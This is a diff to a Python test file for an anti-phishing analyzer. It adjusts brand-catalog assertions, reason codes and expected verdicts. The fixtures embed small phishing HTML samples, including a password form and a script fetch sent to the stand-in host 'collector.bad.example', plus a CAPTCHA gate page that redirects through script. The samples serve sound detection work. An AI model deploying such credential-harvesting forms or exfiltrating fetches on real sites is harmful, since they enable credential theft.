@@ -10,12 +10,14 @@ from antiphish.models import AnalysisStatus, Verdict
 
 def test_active_brand_catalog_is_curated_and_well_formed():
     brands = json.loads((RESOURCE_DIR / "brands.json").read_text(encoding="utf-8"))["brands"]
-    assert len(brands) == 75
+    assert len([item for item in brands if item.get('active')]) >= 100
     assert len({item["name"].casefold() for item in brands}) == len(brands)
     for item in brands:
-        assert item["active"] is True
-        assert item["domains"]
-        assert len(item["references"]) >= 2
+        if item.get('active'):
+            assert item["domains"]
+            assert len(item["references"]) >= 2
+        else:
+            assert not item['domains']
         assert all(domain == domain.casefold().strip(".") and "://" not in domain for domain in item["domains"])
 
 
@@ -26,7 +28,8 @@ def test_unknown_brand_composite_is_phishing(empty_kb):
     <a href='https://collector.bad.example'>https://portal.corp.example/login</a></body></html>"""
     report = Analyzer(empty_kb).analyze(body, name="unknown.html")
     assert report.verdict == Verdict.PHISHING
-    assert {"SENSITIVE_FORM", "SCRIPT_EXFILTRATION", "DISPLAY_HREF_MISMATCH"} <= {e.code for e in report.reason_codes}
+    assert {"SENSITIVE_FORM", "PHISHING_FORM_ROUTE", "DISPLAY_HREF_MISMATCH"} <= {e.code for e in report.reason_codes}
+    assert "SCRIPT_EXFILTRATION" not in {e.code for e in report.reason_codes}  # no field reads
 
 
 def test_brand_newsletter_tracking_link_is_not_a_mismatch(empty_kb):
@@ -55,11 +58,11 @@ def test_password_expiry_lure_is_review_not_block(empty_kb):
     assert "CREDENTIAL_LURE" in {e.code for e in report.reason_codes}
 
 
-def test_active_captcha_cloaking_is_review_not_block(empty_kb):
+def test_captcha_and_ordinary_network_activity_are_neutral(empty_kb):
     body = b"<html><body>Verify you are human CAPTCHA<script>fetch('https://gate.example/api'); location='https://gate.example/x'</script></body></html>"
     report = Analyzer(empty_kb).analyze(body, name="gate.html")
-    assert report.verdict == Verdict.SUSPICIOUS
-    assert "ACTIVE_CLOAKING" in {e.code for e in report.reason_codes}
+    assert report.verdict == Verdict.NOT_DETECTED
+    assert "ACTIVE_CLOAKING" not in {e.code for e in report.reason_codes}
 
 
 def test_obfuscation_requires_lure_context(empty_kb):
@@ -81,7 +84,8 @@ def test_failed_optional_model_does_not_downgrade_static_phishing(empty_kb, monk
     body = b"<form action='https://collector.bad.example'><input type=password></form><script>fetch('https://collector.bad.example')</script><a href='https://collector.bad.example'>https://portal.example</a>"
     report = Analyzer(empty_kb).analyze(body, name="phish.html", profile="deep")
     assert report.verdict == Verdict.PHISHING
-    assert report.analysis_status == AnalysisStatus.COMPLETE
+    assert report.analysis_status == AnalysisStatus.PARTIAL
+    assert report.configuration['static_analysis_status'] == 'COMPLETE'
     assert report.model_warnings == ["fixture model unavailable"]
 
 
@@ -109,4 +113,6 @@ def _partial_extract(body):
     from antiphish.extractors import extract_html
     result = extract_html(body, DEFAULT_LIMITS)
     result.warnings.append("fixture partial")
+    for page in result.pages:
+        page.complete = False
     return result
